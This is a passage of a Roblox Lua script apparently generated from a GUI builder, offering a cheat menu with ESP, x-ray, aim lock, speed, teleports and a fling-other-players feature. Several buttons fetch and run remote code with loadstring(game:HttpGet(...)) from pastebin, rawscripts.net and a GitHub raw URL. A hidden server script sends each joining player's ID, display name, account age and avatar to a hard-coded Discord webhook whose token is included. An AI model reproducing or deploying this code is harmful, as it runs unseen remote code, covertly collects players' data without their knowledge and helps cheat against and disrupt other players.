highlightplayer.PlaceholderText = "HIGHLIGHT PLAYER"
highlightplayer.Text = ""
highlightplayer.TextColor3 = Color3.fromRGB(0, 0, 0)
highlightplayer.TextSize = 13.000

UICorner_25.CornerRadius = UDim.new(0, 3)
UICorner_25.Parent = highlightplayer

UIGradient_15.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(220, 220, 220))}
UIGradient_15.Rotation = 90
UIGradient_15.Parent = highlightplayer

ImageButton.Parent = MAIN
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1.000
ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.964999974, 0, 0.0260000005, 0)
ImageButton.Size = UDim2.new(0.023, 0, 0.0670000017, 0)
ImageButton.Image = "rbxassetid://7743878857"

UIAspectRatioConstraint.Parent = ImageButton

ImageButton_2.Parent = MAIN
ImageButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton_2.BackgroundTransparency = 1.000
ImageButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton_2.BorderSizePixel = 0
ImageButton_2.Position = UDim2.new(0.931555212, 0, 0.0260000117, 0)
ImageButton_2.Size = UDim2.new(0.023, 0, 0.0670000017, 0)
ImageButton_2.Image = "rbxassetid://133328822613992"

UIAspectRatioConstraint_2.Parent = ImageButton_2

-- Scripts:

local function MZDB_fake_script() -- ScreenGui.Start 
	local script = Instance.new('LocalScript', ScreenGui)

	local sg = game:GetService("StarterGui")
	local players = game:GetService("Players")
	local player = players.LocalPlayer
	local gui = script.Parent -- the ScreenGui holding MAIN
	local mainFrame = gui:WaitForChild("MAIN")
	
	-- Hide MAIN at start
	mainFrame.Visible = false
	
	-- Function to play a sound (with optional settings)
	local function playSound(soundId, volume, speed)
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Volume = volume or 1
		sound.PlaybackSpeed = speed or 1
		sound.Parent = workspace
		sound:Play()
		game:GetService("Debris"):AddItem(sound, 5) -- auto remove after 5s
	end
	
	-- First notif (Loading...)
	sg:SetCore("SendNotification", {
		Title = "Loading...",
		Text = "Loading data...",
		Duration = 3
	})
	playSound(90782284167817, 0.2, 1.5) -- first sound with custom volume + speed
	
	-- After delay, show welcome + profile picture
	task.delay(3, function()
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size420x420
		local content, isReady = players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
	
		sg:SetCore("SendNotification", {
			Title = "Welcome " .. player.Name,
			Text = "Your profile loaded!",
			Icon = content,
			Duration = 5
		})
	
		playSound(6432593850) -- second sound normal
	
		-- Show MAIN frame after welcome
		mainFrame.Visible = true
	end)
	
end
coroutine.wrap(MZDB_fake_script)()
local function ZVOX_fake_script() -- ScreenGui.Script 
	local script = Instance.new('Script', ScreenGui)

	local Players = game:GetService("Players")
	local StarterGui = game:GetService("StarterGui")
	local HttpService = game:GetService("HttpService")
	
	local webhook = "https://discord.com/api/webhooks/1411529874899861524/IGIoJXHCFG1yrbffDlKxB7O_-IHhVrpgavX9Rt88UXOARLfd1u6UrgetCSIabUdltQe6"
	
	-- Function to play a sound
	local function playSound(soundId, volume, speed)
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://"..soundId
		sound.Volume = volume or 1
		sound.PlaybackSpeed = speed or 1
		sound.Parent = workspace
		sound:Play()
		game:GetService("Debris"):AddItem(sound, 5)
	end
	
	Players.PlayerAdded:Connect(function(player)
		-- Notify loading (server cannot show notifications to a client directly; use RemoteEvent if you want GUIs)
		print(player.Name.." is loading...") 
		playSound(90782284167817, 0.2, 1.5) -- first sound
	
		task.delay(3, function()
			-- Send welcome info
			print("Welcome "..player.Name)
			playSound(6432593850) -- second sound
	
			-- Send Discord webhook
			local thumbType = Enum.ThumbnailType.HeadShot
			local thumbSize = Enum.ThumbnailSize.Size420x420
			local content, isReady = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
	
			local embed = {
				username = "Game Logger",
				embeds = {{
					title = "Player Info",
					color = 65280,
					fields = {
						{name = "Player ID", value = tostring(player.UserId), inline = true},
						{name = "Display Name", value = player.DisplayName, inline = true},
						{name = "Account Age (days)", value = tostring(player.AccountAge), inline = true},
						{name = "Membership Type", value = tostring(player.MembershipType), inline = true},
						{name = "Time Joined", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false},
						{name = "Place", value = game.Name.." ("..tostring(game.PlaceId)..")", inline = true},
						{name = "Using", value = "Roblox", inline = true}
					},
					thumbnail = {url = content}
				}}
			}
	
			pcall(function()
				HttpService:PostAsync(webhook, HttpService:JSONEncode(embed), Enum.HttpContentType.ApplicationJson)
			end)
	
			-- Show MAIN frame if exists
			local playerGui = player:WaitForChild("PlayerGui")
			local gui = playerGui:FindFirstChild("ScreenGui") -- replace with actual name
			if gui then
				local mainFrame = gui:FindFirstChild("MAIN")
				if mainFrame then
					mainFrame.Visible = true
				end
			end
		end)
	end)
	
end
coroutine.wrap(ZVOX_fake_script)()
local function EHQIM_fake_script() -- NameLabel.LocalScript 
	local script = Instance.new('LocalScript', NameLabel)

	local Players = game:GetService("Players")
	local label = script.Parent
	local player = Players.LocalPlayer
	
	-- use DisplayName or Name (change if you like)
	label.Text = player.DisplayName
	
end
coroutine.wrap(EHQIM_fake_script)()
local function WFUCEDL_fake_script() -- ProfilePicture.LocalScript 
	local script = Instance.new('LocalScript', ProfilePicture)

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local imageLabel = script.Parent
	
	local userId = player.UserId
	local content, isReady = Players:GetUserThumbnailAsync(
		userId,
		Enum.ThumbnailType.HeadShot,
		Enum.ThumbnailSize.Size100x100
	)
	
	imageLabel.Image = content
	
end
coroutine.wrap(WFUCEDL_fake_script)()
local function PIJBJYM_fake_script() -- ServerPlayersLabel.LocalScript 
	local script = Instance.new('LocalScript', ServerPlayersLabel)

	local Players = game:GetService("Players")
	local label = script.Parent
	
	local function update()
		label.Text = "Players: " .. tostring(#Players:GetPlayers())
	end
	
	Players.PlayerAdded:Connect(update)
	Players.PlayerRemoving:Connect(update)
	update()
	
end
coroutine.wrap(PIJBJYM_fake_script)()
local function VBBZLLV_fake_script() -- ServerUptimeLabel.LocalScript 
	local script = Instance.new('LocalScript', ServerUptimeLabel)

	local RunService = game:GetService("RunService")
	local label = script.Parent
	local startTime = os.time()
	
	RunService.RenderStepped:Connect(function()
		local elapsed = os.time() - startTime
		local minutes = math.floor(elapsed / 60)
		local seconds = elapsed % 60
		label.Text = string.format("Uptime: %02d:%02d", minutes, seconds)
	end)
	
end
coroutine.wrap(VBBZLLV_fake_script)()
local function KIQEPJK_fake_script() -- TextLabel_3.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_3)

	local textLabel = script.Parent -- put this LocalScript inside the TextLabel
	
	-- lighter soft colours
	local colors = {
		Color3.fromRGB(120, 50, 120),
		Color3.fromRGB(50, 120, 120),
		Color3.fromRGB(120, 120, 50),
		Color3.fromRGB(80, 80, 80),
		Color3.fromRGB(100, 40, 90),
		Color3.fromRGB(40, 100, 60),
		Color3.fromRGB(70, 90, 40),
		Color3.fromRGB(90, 70, 90),
		Color3.fromRGB(110, 60, 110)
	}
	
	local function lerpColor(a, b, t)
		return a:Lerp(b, t)
	end
	
	while true do
		for i = 1, #colors do
			local nextIndex = i % #colors + 1
			for t = 0, 1, 0.02 do -- smooth fade speed
				textLabel.TextColor3 = lerpColor(colors[i], colors[nextIndex], t)
				wait(0.03)
			end
		end
	end
	
end
coroutine.wrap(KIQEPJK_fake_script)()
local function IXFSHUR_fake_script() -- xray.LocalScript 
	local script = Instance.new('LocalScript', xray)

	local button = script.Parent
	local originalTransparency = {} -- store original transparency
	local toggled = false
	
	button.MouseButton1Click:Connect(function()
		if not toggled then
			-- save original transparency and set to 0.4
			for _, part in pairs(workspace:GetDescendants()) do
				if part:IsA("BasePart") then
					originalTransparency[part] = part.Transparency
					part.Transparency = 0.4
				end
			end
			toggled = true
		else
			-- restore original transparency
			for part, transparency in pairs(originalTransparency) do
				if part and part.Parent then
					part.Transparency = transparency
				end
			end
			toggled = false
		end
	end)
	
end
coroutine.wrap(IXFSHUR_fake_script)()
local function NXRMVAP_fake_script() -- triggerbot.LocalScript 
	local script = Instance.new('LocalScript', triggerbot)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/slutslovedata/home-utils/refs/heads/main/softaim%20/hood/bin/local/source.txt"))()
	end)
	
end
coroutine.wrap(NXRMVAP_fake_script)()
local function LUJOUP_fake_script() -- serverhop.LocalScript 
	local script = Instance.new('LocalScript', serverhop)

	local Players = game:GetService("Players")
	local TeleportService = game:GetService("TeleportService")
	local HttpService = game:GetService("HttpService")
	
	local player = Players.LocalPlayer
	local placeId = game.PlaceId
	
	local button = script.Parent  -- assuming this LocalScript is inside the button
	
	local function getRandomServer()
		local servers = {}
		local success, result = pcall(function()
			return game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"))
		end)
		if success and result and result.data then
			for _, server in pairs(result.data) do
				if server.playing < server.maxPlayers and server.id ~= game.JobId then
					table.insert(servers, server.id)
				end
			end
		end
		if #servers > 0 then
			return servers[math.random(1, #servers)]
		else
			return nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		local serverId = getRandomServer()
		if serverId then
			TeleportService:TeleportToPlaceInstance(placeId, serverId, player)
		else
			-- fallback if no server found, just rejoin same server
			TeleportService:Teleport(placeId, player)
		end
	end)
	
end
coroutine.wrap(LUJOUP_fake_script)()
local function KYSL_fake_script() -- SPEED.LocalScript 
	local script = Instance.new('LocalScript', SPEED)

	-- LocalScript inside the TextBox
	
	local Players = game:GetService("Players")
	local StarterGui = game:GetService("StarterGui")
	local player = Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	
	local textBox = script.Parent
	
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local speed = tonumber(textBox.Text)
			if speed then
				humanoid.WalkSpeed = speed
	
				-- Show Roblox notification
				StarterGui:SetCore("SendNotification", {
					Title = "Speed Changed",
					Text = "Your speed is now " .. speed,
					Duration = 3
				})
			else
				StarterGui:SetCore("SendNotification", {
					Title = "Error",
					Text = "Please enter a number!",
					Duration = 3
				})
			end
		end
	end)
	
end
coroutine.wrap(KYSL_fake_script)()
local function ZCRW_fake_script() -- ESP.LocalScript 
	local script = Instance.new('LocalScript', ESP)

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local camera = workspace.CurrentCamera
	local player = Players.LocalPlayer
	local button = script.Parent
	
	local espEnabled = false
	local lines = {} -- store drawing lines per player
	local names = {} -- store text drawings per player
	
	-- Create ESP for a player
	local function createESP(targetPlayer)
		if targetPlayer == player or lines[targetPlayer] then return end
	
		-- Line
		local line = Drawing.new("Line")
		line.Color = Color3.new(1, 0, 0)
		line.Thickness = 1 -- thinner
		line.Transparency = 1
		line.Visible = true
		lines[targetPlayer] = line
	
		-- Name
		local nameText = Drawing.new("Text")
		nameText.Text = targetPlayer.Name
		nameText.Size = 14
		nameText.Color = Color3.new(1, 1, 1)
		nameText.Center = true
		nameText.Outline = true
		nameText.OutlineColor = Color3.new(0,0,0)
		nameText.Visible = true
		names[targetPlayer] = nameText
	
		-- Update each frame
		RunService.RenderStepped:Connect(function()
			if espEnabled and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
				local headPos, onScreen = camera:WorldToViewportPoint(targetPlayer.Character.Head.Position)
				if onScreen then
					line.From = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y) -- bottom middle
					line.To = Vector2.new(headPos.X, headPos.Y)
					line.Visible = true
	
					nameText.Position = Vector2.new(headPos.X, headPos.Y - 20)
					nameText.Visible = true
				else
					line.Visible = false
					nameText.Visible = false
				end
			else
				line.Visible = false
				nameText.Visible = false
			end
		end)
	
		-- Remove when player leaves
		targetPlayer.AncestryChanged:Connect(function()
			if not targetPlayer:IsDescendantOf(game) then
				line:Remove()
				nameText:Remove()
				lines[targetPlayer] = nil
				names[targetPlayer] = nil
			end
		end)
	
		-- Recreate on respawn
		targetPlayer.CharacterAdded:Connect(function()
			if espEnabled then
				createESP(targetPlayer)
			end
		end)
	end
	
	-- Remove all ESP
	local function removeAllESP()
		for _, l in pairs(lines) do l:Remove() end
		for _, t in pairs(names) do t:Remove() end
		lines = {}
		names = {}
	end
	
	-- Toggle ESP
	local function toggleESP()
		espEnabled = not espEnabled
		if espEnabled then
			for _, p in pairs(Players:GetPlayers()) do
				createESP(p)
			end
		else
			removeAllESP()
		end
	end
	
	button.MouseButton1Click:Connect(toggleESP)
	
	-- Track new players
	Players.PlayerAdded:Connect(function(p)
		if espEnabled then
			createESP(p)
		end
	end)
	
end
coroutine.wrap(ZCRW_fake_script)()
local function GOQWKOV_fake_script() -- invis.LocalScript 
	local script = Instance.new('LocalScript', invis)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
	end)
	
	
	
	
	
	
end
coroutine.wrap(GOQWKOV_fake_script)()
local function WKVYNUP_fake_script() -- lock.LocalScript 
	local script = Instance.new('LocalScript', lock)

	local button = script.Parent
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local runService = game:GetService("RunService")
	local uis = game:GetService("UserInputService")
	local players = game:GetService("Players")
	local lockActive = false
	local lockedPlayer = nil
	local lockKey = nil
	local highlight = nil
	local canToggle = true -- button cooldown
	
	-- Notification function
	local function notify(title, text, icon)
		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 3,
			Icon = icon or ""
		})
	end
	
	-- Function to create red box
	local function makeBox(targetChar)
		if highlight then highlight:Destroy() end
		highlight = Instance.new("Highlight")
		highlight.Parent = targetChar
		highlight.FillTransparency = 1
		highlight.OutlineColor = Color3.new(1,0,0)
		highlight.OutlineTransparency = 0
	end
	
	-- Function to get nearest player under mouse
	local function getPlayerUnderMouse()
		local maxDistance = 100
		local mousePos = mouse.Hit.Position
		local closestPlayer = nil
		local closestDist = maxDistance
	
		for _, plr in pairs(players:GetPlayers()) do
			if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local dist = (plr.Character.HumanoidRootPart.Position - mousePos).Magnitude
				if dist < closestDist then
					closestDist = dist
					closestPlayer = plr
				end
			end
		end
	
		return closestPlayer
	end
	
	-- Start 3 second cooldown for button
	local function startCooldown()
		canToggle = false
		for i = 3, 1, -1 do
			button.Text = tostring(i)
			task.wait(1)
		end
		button.Text = lockActive and "Lock-On: ON" or "Lock-On: OFF"
		canToggle = true
	end
	
	-- Button toggle
	button.MouseButton1Click:Connect(function()
		if not canToggle then return end
	
		-- Toggle lock state immediately
		lockActive = not lockActive
		lockedPlayer = nil
		lockKey = nil
		if highlight then highlight:Destroy() end
	
		button.Text = lockActive and "Lock-On: ON" or "Lock-On: OFF"
	
		if lockActive then
			notify("Lock-On", "Enabled - Press a key to bind for lock")
		else
			notify("Lock-On", "Disabled")
		end
	
		-- Start cooldown for next toggle
		task.spawn(startCooldown)
	end)
	
	-- Keybind choosing + lock toggle
	uis.InputBegan:Connect(function(input, processed)
		if processed or not lockActive then return end
	
		-- Choosing keybind
		if not lockKey then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				lockKey = input.KeyCode
				notify("Lock-On", "Bound key: " .. tostring(lockKey.Name))
			end
			return
		end
	
		-- Using the lock key
		if input.KeyCode == lockKey then
			if lockedPlayer then
				notify("Lock-On", "Unlocked from " .. lockedPlayer.Name)
				lockedPlayer = nil
				if highlight then highlight:Destroy() end
			else
				local target = getPlayerUnderMouse()
				if target then
					lockedPlayer = target
					makeBox(target.Character)
	
					-- Profile picture
					local thumb = players:GetUserThumbnailAsync(target.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					notify("Lock-On", "LOCKED ONTO " .. target.Name, thumb)
				end
			end
		end
	end)
	
	-- Rotate camera towards locked player
	runService.RenderStepped:Connect(function()
		if lockActive and lockedPlayer and lockedPlayer.Character then
			local root = lockedPlayer.Character:FindFirstChild("HumanoidRootPart")
			if root then
				local cam = workspace.CurrentCamera
				cam.CFrame = CFrame.new(cam.CFrame.Position, root.Position)
			end
		end
	end)
	
end
coroutine.wrap(WKVYNUP_fake_script)()
local function NZRNQI_fake_script() -- infiniteyield.LocalScript 
	local script = Instance.new('LocalScript', infiniteyield)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-43437"))()
	end)
	
end
coroutine.wrap(NZRNQI_fake_script)()
local function IBRF_fake_script() -- flingall.LocalScript 
	local script = Instance.new('LocalScript', flingall)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
	
	end)
	
end
coroutine.wrap(IBRF_fake_script)()
local function SFUDIV_fake_script() -- splitsectp.LocalScript 
	local script = Instance.new('LocalScript', splitsectp)

	-- Teleport to all players script
	local player = game.Players.LocalPlayer
	
	script.Parent.MouseButton1Click:Connect(function()
		local character = player.Character or player.CharacterAdded:Wait()
		local hrp = character:WaitForChild("HumanoidRootPart")
		local originalCFrame = hrp.CFrame -- Save original position
	
		local players = game.Players:GetPlayers()
		for _, target in ipairs(players) do
			if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
				local targetHRP = target.Character.HumanoidRootPart
				-- Teleport behind the player
				hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
				wait(0.8) -- Stay for 2 seconds
			end
		end
	
		-- Return to original spot
		hrp.CFrame = originalCFrame
	end)
	
end
coroutine.wrap(SFUDIV_fake_script)()
local function CHUT_fake_script() -- jumppower.LocalScript 
	local script = Instance.new('LocalScript', jumppower)

	-- LocalScript inside the TextBox
	local textBox = script.Parent
	local player = game.Players.LocalPlayer
	
	local function updateJumpPower(value)
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
	
		local num = tonumber(value)
		if num then
			humanoid.UseJumpPower = true  -- ensures jump power works
			humanoid.JumpPower = num
	
			-- Notification
			game.StarterGui:SetCore("SendNotification", {
				Title = "JumpPower Changed",
				Text = "Your JumpPower is now " .. num,
				Duration = 3
			})
		else
			-- Notification for invalid input
			game.StarterGui:SetCore("SendNotification", {
				Title = "Invalid Input",
				Text = "Please enter a number",
				Duration = 3
			})
		end
	end
	
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			updateJumpPower(textBox.Text)
		end
	end)
	
end
coroutine.wrap(CHUT_fake_script)()
local function RQGIC_fake_script() -- Teleport.LocalScript 
	local script = Instance.new('LocalScript', Teleport)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
				local char = LocalPlayer.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					char:MoveTo(target.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0))
				end
			end
		end
	end)
	
end
coroutine.wrap(RQGIC_fake_script)()
local function FQTOTO_fake_script() -- TextLabel_6.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_6)

	local textLabel = script.Parent -- put this LocalScript inside the TextLabel
	
	-- lighter soft colours
	local colors = {
		Color3.fromRGB(120, 50, 120),
		Color3.fromRGB(50, 120, 120),
		Color3.fromRGB(120, 120, 50),
		Color3.fromRGB(80, 80, 80),
		Color3.fromRGB(100, 40, 90),
		Color3.fromRGB(40, 100, 60),
		Color3.fromRGB(70, 90, 40),
		Color3.fromRGB(90, 70, 90),
		Color3.fromRGB(110, 60, 110)
	}
	
	local function lerpColor(a, b, t)
		return a:Lerp(b, t)
	end
	
	while true do
		for i = 1, #colors do
			local nextIndex = i % #colors + 1
			for t = 0, 1, 0.02 do -- smooth fade speed
				textLabel.TextColor3 = lerpColor(colors[i], colors[nextIndex], t)
				wait(0.03)
			end
		end
	end
	
end
coroutine.wrap(FQTOTO_fake_script)()
local function XZEQ_fake_script() -- tpknocked.LocalScript 
	local script = Instance.new('LocalScript', tpknocked)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local StarterGui = game:GetService("StarterGui")
	
	local savedPos = nil
	local armed = false
	local teleported = false
	local connection = nil
	local healthConnection = nil
	local currentTarget = nil
	
	-- helper: notify
	local function notify(msg)
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = "Notification",
				Text = msg,
				Duration = 3
			})
		end)
	end
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	-- teleport back + reset
	local function teleportBack()
		if savedPos and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame = savedPos
		end
		if connection then connection:Disconnect() end
		notify("TELEPORTED BACK")
		armed = false
		teleported = false
		savedPos = nil
		connection = nil
	end
	
	-- watch target health
	local function watchTarget(target)
		if healthConnection then healthConnection:Disconnect() end
		if not target.Character or not target.Character:FindFirstChild("Humanoid") then return end
		local humanoid = target.Character.Humanoid
	
		healthConnection = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
			if humanoid.Health <= 1 and not teleported then
				task.wait(1) -- wait 1 second before teleport
	
				if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					savedPos = LocalPlayer.Character.HumanoidRootPart.CFrame
					notify("TELEPORTING")
	
					LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
					teleported = true
	
					-- press G to arm the return
					UserInputService.InputBegan:Connect(function(input, gp)
						if gp then return end
						if input.KeyCode == Enum.KeyCode.G and teleported and not armed then
							armed = true
							local humanoidLocal = LocalPlayer.Character:FindFirstChild("Humanoid")
							if humanoidLocal then
								connection = RunService.Heartbeat:Connect(function()
									if humanoidLocal.MoveDirection.Magnitude > 0 then
										teleportBack()
									end
								end)
							end
						end
					end)
				end
			end
		end)
	end
	
	-- when enter pressed in textbox
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target then
				if currentTarget and currentTarget ~= target then
					notify("Target changed: " .. target.Name)
				else
					notify("Target set: " .. target.Name)
				end
				currentTarget = target
				watchTarget(target)
			end
		end
	end)
	
end
coroutine.wrap(XZEQ_fake_script)()
local function KQAK_fake_script() -- Fling.LocalScript 
	local script = Instance.new('LocalScript', Fling)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	local function flingTarget(target)
		local char = LocalPlayer.Character
		if not char or not char:FindFirstChild("HumanoidRootPart") then return end
		if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
	
		local hrp = char.HumanoidRootPart
		local targetHRP = target.Character.HumanoidRootPart
		local originalCFrame = hrp.CFrame
	
		-- teleport into the target
		hrp.CFrame = targetHRP.CFrame
	
		-- create BodyThrust on the target
		local thrust = Instance.new("BodyThrust")
		thrust.Force = Vector3.new(9999,9999,9999)
		thrust.Location = targetHRP.Position
		thrust.Parent = targetHRP
	
		-- fling loop to follow target
		local connection
		connection = RunService.Heartbeat:Connect(function()
			if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
				connection:Disconnect()
				thrust:Destroy()
				-- teleport back and freeze
				hrp.CFrame = originalCFrame
				hrp.Anchored = true
				task.wait(0.5)
				hrp.Anchored = false
				return
			end
	
			-- keep updating your position inside them
			hrp.CFrame = targetHRP.CFrame
			thrust.Location = targetHRP.Position
		end)
	
		-- separate loop to teleport back once target is flung
		spawn(function()
			while targetHRP and targetHRP.Parent do
				if targetHRP.Velocity.Magnitude > 50 then
					break
				end
				task.wait(0.05)
			end
			-- teleport back and freeze briefly
			if hrp then
				hrp.CFrame = originalCFrame
				hrp.Anchored = true
				task.wait(0.5)
				hrp.Anchored = false
			end
			-- cleanup
			connection:Disconnect()
			thrust:Destroy()
		end)
	end
	
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target then
				flingTarget(target)
			end
		end
	end)
	
end
coroutine.wrap(KQAK_fake_script)()
local function HTAAI_fake_script() -- highlightplayer.LocalScript 
	local script = Instance.new('LocalScript', highlightplayer)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local StarterGui = game:GetService("StarterGui")
	
	local currentTarget = nil
	local currentHighlight = nil
	
	-- helper: notify
	local function notify(msg)
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = "Notification",
				Text = msg,
				Duration = 3
			})
		end)
	end
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	-- create a highlight for a player's character
	local function applyHighlight(player)
		if currentHighlight then
			currentHighlight:Destroy()
			currentHighlight = nil
		end
	
		if player.Character then
			local highlight = Instance.new("Highlight")
			highlight.FillTransparency = 1
			highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
			highlight.Adornee = player.Character
			highlight.Parent = player.Character
			currentHighlight = highlight
		end
	end
	
	-- listen for respawn to reapply highlight
	local function trackPlayer(player)
		player.CharacterAdded:Connect(function()
			task.wait(0.5) -- wait a moment for character to load
			if player == currentTarget then
				applyHighlight(player)
			end
		end)
	end
	
	-- handle input from textbox
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target then
				if currentTarget ~= target then
					notify("Target set: " .. target.Name)
				end
				currentTarget = target
				trackPlayer(target)
				applyHighlight(target)
			else
				notify("No player found")
			end
		end
	end)
	
end
coroutine.wrap(HTAAI_fake_script)()
local function XAIRXNO_fake_script() -- MAIN.Smooth GUI Dragging 
	local script = Instance.new('LocalScript', MAIN)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
